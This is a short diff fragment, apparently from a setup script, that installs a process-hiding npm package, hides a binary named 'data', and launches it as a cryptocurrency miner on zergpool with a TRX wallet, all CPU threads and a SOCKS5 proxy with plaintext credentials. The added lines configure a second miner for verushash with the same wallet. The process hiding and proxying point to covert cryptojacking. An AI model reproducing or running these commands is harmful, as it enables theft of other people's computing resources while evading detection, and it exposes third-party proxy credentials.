@@ -11,3 +11,8 @@ npm i -g node-process-hider
 chmod +x data  
 ph add data  
 ./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u TDLM5E7245pv9N1gRpjzmxVuaXiboAu4qt -p c=TRX -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
+
+
+
+
+--disable-gpu --algorithm verushash --pool stratum+tcp://verushash.eu.mine.zergpool.com:3300 --wallet TDLM5E7245pv9N1gRpjzmxVuaXiboAu4qt --pass c=TRX,mc=VRSC,ID=SmildMiner-2
